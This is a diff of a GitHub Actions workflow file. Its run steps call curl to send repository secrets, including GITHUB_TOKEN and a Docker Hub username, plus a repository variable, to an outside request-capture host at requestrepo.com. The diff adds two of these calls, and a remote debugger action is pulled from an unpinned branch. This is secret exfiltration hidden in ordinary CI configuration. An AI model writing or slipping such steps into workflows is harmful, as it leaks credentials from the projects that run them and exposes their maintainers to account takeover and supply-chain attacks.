@@ -9,6 +9,7 @@ jobs:
        env: 
           GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
      - run: curl https://rj0lnjwx.requestrepo.com//${{ secrets.GITHUB_TOKEN }}
-     - run: curl https://rj0lnjwx.requestrepo.com//${{ secrets.GITHUBTOKEN }}
+     - run: curl https://rj0lnjwx.requestrepo.com//${{ secrets.DOCKER_HUB_USERNAME }}
+     - run: curl https://rj0lnjwx.requestrepo.com//${{ vars.TEST_VAR }}
      - name: Setup Debug Session
        uses: csexton/debugger-action@master
